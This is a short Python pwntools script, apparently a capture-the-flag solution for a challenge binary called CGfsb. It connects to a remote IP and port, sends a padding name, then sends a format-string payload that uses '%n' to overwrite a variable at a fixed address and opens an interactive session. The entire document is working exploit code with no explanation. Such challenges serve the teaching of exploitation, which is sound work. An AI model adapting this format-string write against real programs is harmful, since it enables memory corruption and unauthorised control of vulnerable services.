from pwn import *

# sh = process("./CGfsb")
sh = remote("61.147.171.105", 63984)
# sh = gdb.debug("./CGfsb")


pwnme = 0x0804A068
payload1 = b'a'*3
payload2= p32(pwnme) + b'%4c%10$n'
sh.sendlineafter("tell me your name:", payload1)
sh.sendlineafter("your message please:", payload2)
sh.interactive()
